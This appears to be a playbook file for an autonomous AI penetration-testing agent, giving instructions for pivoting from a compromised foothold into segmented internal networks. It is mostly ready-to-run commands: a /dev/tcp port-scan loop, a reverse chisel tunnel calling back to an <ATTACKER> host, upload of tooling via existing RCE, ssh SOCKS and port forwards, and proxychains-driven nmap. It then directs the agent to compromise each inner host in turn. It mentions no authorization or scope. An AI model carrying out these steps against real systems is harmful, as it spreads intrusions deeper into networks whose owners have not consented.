---
name: pivoting
when: a foothold host can reach an inner host/service you cannot reach directly (dual-homed box, SSRF, segmented net)
tools: [session, http_request, shell]
phase: pivot
---
# Pivoting (multi-host)

First map it: `record_host(address=<inner>, reachable_via='<foothold-session>')` so the
topology stays in front of you. From the foothold, discover inner hosts/ports:
`ip a; ip route; arp -a; for p in 22 80 443 5432 6379 8080; do (echo >/dev/tcp/<inner>/$p) 2>/dev/null && echo $p open; done`.

Build a tunnel (pick what the foothold supports):
- **chisel** (baked here, single static binary). On the attacker start a server:
  `chisel server -p 8080 --reverse &`; get chisel onto the foothold (upload via your
  RCE / web-root, or `wget` if it has egress) and run
  `chisel client <ATTACKER>:8080 R:socks` — you now have a SOCKS5 proxy on the
  attacker at `127.0.0.1:1080`.
- **ssh dynamic SOCKS** (if you have ssh creds to the pivot): in a `session`,
  `ssh -D 1080 -N user@<pivot>` → SOCKS5 on `127.0.0.1:1080`.
- **single inner port**: an ssh local forward `ssh -L 1080:<inner>:<port> user@<pivot>`.

Drive tools through the tunnel:
- Web on an inner host: `http_request(method=..., url='http://<inner>/...', proxy='127.0.0.1:1080')`.
- CLI tools: `proxychains -q nmap -sT -Pn <inner>` (proxychains is baked; point its
  config at `socks5 127.0.0.1 1080`, or use `proxychains4`).

Then work the inner host as a fresh target (recon → weakness → foothold), and
`record_host`/`record_access` each hop so a chain of pivots stays legible.
